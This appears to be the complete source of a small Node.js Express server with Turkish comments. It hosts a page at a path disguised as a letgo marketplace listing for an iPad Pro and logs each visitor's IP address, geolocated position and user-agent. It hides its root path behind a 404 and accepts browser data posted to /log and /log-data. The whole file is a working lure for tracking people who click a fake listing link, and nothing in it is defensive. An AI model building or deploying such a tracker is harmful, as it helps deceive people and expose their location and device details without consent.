const express = require('express');
const geoip = require('geoip-lite');
const requestIp = require('request-ip');

const app = express();
app.use(express.static('public'));
app.use(requestIp.mw());
app.use(express.json());

// Düzgün ve karmaşık endpoint (sadece path, query string yok)
app.get('/letgo-urunsatislari-com-ilan-72-ipad-pro-m2-cip-18-ay-garantili', (req, res) => {
    const ip = req.clientIp;
    const geo = geoip.lookup(ip);

    console.log('\n--- Yeni Ziyaret ---');
    console.log('IP:', ip);
    console.log('Konum:', geo || 'Bulunamadı');
    console.log('User-Agent:', req.headers['user-agent']);

    res.sendFile(__dirname + '/public/index.html');
});

// Eski / endpoint'i 404 döndürsün
app.get('/', (req, res) => {
    res.sendStatus(404);
});

app.post('/log', (req, res) => {
    console.log('\n--- Tarayıcı İstemci Verisi ---');
    console.log(req.body);
    res.sendStatus(200);
});

// Add this endpoint to match frontend
app.post('/log-data', (req, res) => {
    console.log('\n--- Tarayıcı İstemci Verisi (log-data) ---');
    console.log(req.body);
    res.sendStatus(200);
});

app.listen(3000, () => console.log('Sunucu: http://localhost:3000'));
